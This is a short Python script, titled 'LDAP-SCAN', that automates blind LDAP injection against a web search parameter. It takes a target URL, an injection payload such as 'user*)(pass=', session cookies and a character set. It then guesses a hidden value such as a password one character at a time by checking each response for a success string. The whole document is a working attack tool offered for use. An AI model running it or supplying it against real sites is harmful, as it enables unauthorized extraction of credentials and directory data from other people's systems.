import requests
import platform

banner = '''
LDAP-SCAN
'''

print(banner)

url = input("Enter full url ( e.g. http://my-url.com/?search= ) : ")
print("")
payload = input("Enter payload ( e.g. user*)(pass= ) : ")
print("")
cookies_array = input("Enter cookies separated with commas ( e.g. = cookie1:123,cookie2:345 ) : ")
print("")
cookies_array = cookies_array.split(",")

my_cookies = {}

for c in cookies_array:
	kv = c.split(":")
	my_cookies[kv[0]] = kv[1]

charset = input("Enter characters to use : ")
print("")
charset = [char for char in charset]

success = input("Enter success value that is displayed on page : ")
print("")
found = True

result = ""

while found == True:

	found = False
	for char in charset:

		res = requests.get(url+payload+result+char, cookies=my_cookies)
		if success in res.text:
			result += char
			found = True
			break

print(result)
